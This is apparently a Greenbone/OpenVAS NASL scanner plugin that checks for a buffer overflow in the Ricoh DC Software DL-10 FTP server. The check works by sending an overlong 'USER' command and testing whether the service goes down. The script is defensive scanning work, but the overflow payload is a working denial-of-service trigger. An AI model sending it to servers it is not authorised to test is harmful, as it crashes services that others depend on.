# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902821");
  script_version("2021-11-22T14:21:24+0000");
  script_tag(name:"last_modification", value:"2021-11-22 14:21:24 +0000 (Mon, 22 Nov 2021)");
  script_tag(name:"creation_date", value:"2012-03-26 14:14:14 +0530 (Mon, 26 Mar 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2012-5002", "CVE-2015-6750");

  script_tag(name:"qod", value:"30");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Ricoh DC Software DL-10 FTP Server 'USER' Command Buffer Overflow Vulnerability");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("FTP");
  # nb: Don't add a script_mandatory_keys(), this should run against every Telnet service as
  # requested by a customer.
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
  arbitrary code within the context of the affected application. Failed exploit attempts will result
  in a denial-of-service condition.");

  script_tag(name:"affected", value:"Ricoh DC Software DL-10 version 4.5.0.1. Other products might
  be affected as well.");

  script_tag(name:"insight", value:"The flaw is caused by improper bounds checking by the FTP server
  when processing malicious FTP commands. This can be exploited to cause a stack-based buffer
  overflow via an overly long 'USER' FTP command.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"summary", value:"Ricoh DC Software DL-10 FTP Server is prone to a buffer overflow
  vulnerability.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47912");
  script_xref(name:"URL", value:"http://security.inshell.net/advisory/5");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52235");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/73591");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18643");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18658");

  exit(0);
}

include("ftp_func.inc");
include("port_service_func.inc");

port = ftp_get_port(default:21);

if(!soc = ftp_open_socket(port:port))
  exit(0);

exploit = "USER " + crap(300);

ftp_send_cmd(socket:soc, cmd:exploit);
ftp_close(socket:soc);
sleep(2);

soc1 = open_sock_tcp(port);
if(!soc1) {
  security_message(port:port);
  exit(0);
}

ftp_close(socket:soc1);

exit(0);